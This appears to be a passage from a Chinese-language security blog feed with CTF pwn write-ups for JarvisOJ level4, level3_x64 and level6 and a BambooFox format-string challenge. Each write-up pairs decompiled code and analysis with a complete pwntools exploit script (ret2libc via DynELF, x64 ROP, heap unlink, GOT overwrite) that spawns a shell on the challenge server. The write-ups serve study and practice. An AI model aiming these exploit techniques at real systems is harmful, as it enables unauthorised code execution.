      <content type="html"><![CDATA[<p><em>开始漫漫刷题之路</em></p><h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p><em>参考:<a href="&quot;https://blog.csdn.net/u011987514/article/details/68490157&quot;">借助DynELF实现无libc的漏洞利用小结</a></em></p><h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p><em>搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸<br>重新下载源文件，问题解决。。。</em></p><h2 id="信息："><a href="#信息：" class="headerlink" title="信息："></a>信息：</h2><p>漏洞函数：明显的栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7uLL);</span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。</p><h2 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)</span><br><span class="line">#sh = process(&apos;level3&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line">sys_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------# </span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1)    //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。</span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">sh.send(pay1)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line"></span><br><span class="line">#---------call system func---------------#</span><br><span class="line">sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addr</span><br><span class="line">binsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addr</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; </span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>—之后再做—</p><h1 id="level6-堆的unlink利用"><a href="#level6-堆的unlink利用" class="headerlink" title="level6 - 堆的unlink利用"></a>level6 - 堆的unlink利用</h1><p>正常的选项类型题</p><h2 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h2><p>main:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line"></span><br><span class="line">  alarm_func();</span><br><span class="line">  main_ptr();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = menu();</span><br><span class="line">LABEL_3:</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        list();</span><br><span class="line">        continue;</span><br><span class="line">      case 2u:</span><br><span class="line">        add();</span><br><span class="line">        continue;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        continue;</span><br><span class="line">      case 4u:</span><br><span class="line">        delete();</span><br><span class="line">        v0 = menu();</span><br><span class="line">        if ( v0 &gt; 5 )</span><br><span class="line">          goto LABEL_6;</span><br><span class="line">        goto LABEL_3;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;Bye&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">      default:</span><br><span class="line">LABEL_6:</span><br><span class="line">        puts(&quot;Invalid!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题函数：<br>delete函数未检查inuse位，可以double free，且free完并未清空指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // edx</span><br><span class="line">  int v3; // eax</span><br><span class="line"></span><br><span class="line">  if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( v0 &lt; 0 )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  v1 = dword_804A2EC;</span><br><span class="line">  if ( v0 &gt;= *(_DWORD *)dword_804A2EC )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_DWORD *)(dword_804A2EC + 4);</span><br><span class="line">  v3 = v1 + 12 * v0;</span><br><span class="line">  *(_DWORD *)(v3 + 8) = 0;</span><br><span class="line">  *(_DWORD *)(v3 + 12) = 0;</span><br><span class="line">  free(*(void **)(v3 + 16));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。</p><p>保护：（基本上不用看。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/root/pwnprac/freenote_x86&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="思路-有点迷"><a href="#思路-有点迷" class="headerlink" title="思路(有点迷)"></a>思路(有点迷)</h2><p>   首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以<br>edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即<br>刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。<br>    之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) </p><h2 id="poc（待参透）"><a href="#poc（待参透）" class="headerlink" title="poc（待参透）"></a>poc（待参透）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    cn = process(&quot;./freenote_x86&quot;)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line"></span><br><span class="line">def list_post():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def add_post(length,content):</span><br><span class="line">    cn.sendline(&apos;2&apos;)</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_post(idx,length,content):</span><br><span class="line">    cn.sendline(&apos;3&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_post(idx):</span><br><span class="line">    cn.sendline(&apos;4&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">#chunk_list=0x0804A2EC</span><br><span class="line">#test=0x08048CC5</span><br><span class="line"></span><br><span class="line">#-------init-------</span><br><span class="line">for i in range(5):</span><br><span class="line">    add_post(0x80,str(i)*0x80)</span><br><span class="line"></span><br><span class="line">del_post(3)</span><br><span class="line">del_post(1)</span><br><span class="line"></span><br><span class="line">pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8</span><br><span class="line">edit_post(0,0x88,pay)</span><br><span class="line">#------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;a&apos;*0x8)</span><br><span class="line">leak_addr = u32(cn.recv(4))</span><br><span class="line">cn.recv()</span><br><span class="line">heap_base = leak_addr - 0xdb0#offset</span><br><span class="line">chunk0_addr = heap_base + 0x18</span><br><span class="line">success(&quot;leak_addr: &quot;+hex(leak_addr))</span><br><span class="line">success(&quot;heap_base: &quot;+hex(heap_base))</span><br><span class="line">success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#-------unlink--------</span><br><span class="line">pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)</span><br><span class="line">pay += p32(0x80) + p32(0x88+0x88)</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">del_post(1)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)</span><br><span class="line">pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])</span><br><span class="line">pay += &apos;\x00&apos;*(0x88-len(pay))</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;0. &apos;)</span><br><span class="line">cn.recvuntil(&apos;1. &apos;)</span><br><span class="line">strtol = cn.recvuntil(&apos;\x0a&apos;)[:-1]</span><br><span class="line">cn.recv()</span><br><span class="line">strtol = u32(strtol)</span><br><span class="line">system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&quot;strtol: &quot;+hex(strtol))</span><br><span class="line">success(&quot;system: &quot;+hex(system))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------hijack&amp;getshell--------</span><br><span class="line">edit_post(1,4,p32(system))</span><br><span class="line">cn.sendline(&quot;$0&quot;)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>获得shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your choice: $ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwn-300-Formatting string vulnerability</title>
      <link href="/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/"/>
      <url>/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/</url>
      <content type="html"><![CDATA[<p><em>pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。</em><br><em>而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。</em></p><h1 id="查看内容及保护"><a href="#查看内容及保护" class="headerlink" title="查看内容及保护"></a>查看内容及保护</h1><h2 id="main函数为："><a href="#main函数为：" class="headerlink" title="main函数为："></a>main函数为：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+Ch] [ebp-4Ch]</span><br><span class="line">  unsigned int v5; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);  //canary生成</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  fgets(&amp;s, 64, stdin);   //fgets,遇/x00停止</span><br><span class="line">  printf(&amp;s);             //格式化字符串漏洞</span><br><span class="line">  fgets(&amp;s, 64, stdin);</span><br><span class="line">  printf(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查看文件保护"><a href="#查看文件保护" class="headerlink" title="查看文件保护"></a>查看文件保护</h2><p>仍然是canary 与 栈不可执行；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# checksec binary_300</span><br><span class="line">[*] &apos;/root/tikool/binary_300&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="查看加载函数"><a href="#查看加载函数" class="headerlink" title="查看加载函数"></a>查看加载函数</h2><p>发现system函数</p><figure class="image-box">                <img src="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/system.png" alt="加载函数" title="" class="">                <p>加载函数</p>            </figure><h1 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h1><p>想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell；</p><h1 id="流程实现"><a href="#流程实现" class="headerlink" title="流程实现"></a>流程实现</h1><h2 id="确定字符串位置"><a href="#确定字符串位置" class="headerlink" title="确定字符串位置"></a>确定字符串位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# ./binary_300</span><br><span class="line">aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x </span><br><span class="line">aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e</span><br></pre></td></tr></table></figure><p>即字符串位于第六（相对于<strong>）或第七个（相对于</strong>）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./binary_300&apos;)</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)</span><br><span class="line">libc = ELF(&apos;./binary_300&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = libc.got[&apos;printf&apos;]</span><br><span class="line">system_add = libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;)  //pwntools自带，用于生成格式化字符串payload；</span><br><span class="line"></span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ /bin/sh</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> format </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn 1.3--plt/got</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/</url>
